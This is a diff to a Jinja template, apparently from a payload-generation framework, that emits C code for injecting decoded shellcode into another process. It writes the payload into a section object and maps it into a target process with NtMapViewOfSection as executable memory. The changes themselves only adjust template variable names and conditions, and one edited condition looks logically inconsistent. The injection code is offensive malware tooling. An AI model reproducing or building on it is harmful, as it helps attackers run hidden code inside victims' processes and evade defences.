@@ -7,7 +7,7 @@
       ViewUnmap = 2
     } SECTION_INHERIT, *PSECTION_INHERIT;	
 
-    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
+    {% if link.functions.value in ["dynamic", "direct"] %}
         {{ function_typedef("NtCreateSection") }}
         {{ function_typedef("NtMapViewOfSection") }}
         {{ function_typedef("NtUnmapViewOfSection") }}
@@ -27,12 +27,12 @@
 
         memcpy(mem, decoded, length);
 
-        {% if not stub and stub.yaml_tag != "!modifier.CreateThreadStub" %}
+        {% if stub is defined and not stub and stub.yaml_tag != "!modifier.CreateThreadStub" %}
             pNtUnmapViewOfSection(hSelfProc, mem);
         {% endif %}
 
         PVOID pRemoteView = NULL;
-        {% if link.alloc.protection.value == "rx" %}
+        {% if protection.value == "rx" %}
             pNtMapViewOfSection(hSection, hTargetProc, &pRemoteView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_EXECUTE_READ);
         {% else %}
             pNtMapViewOfSection(hSection, hTargetProc, &pRemoteView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
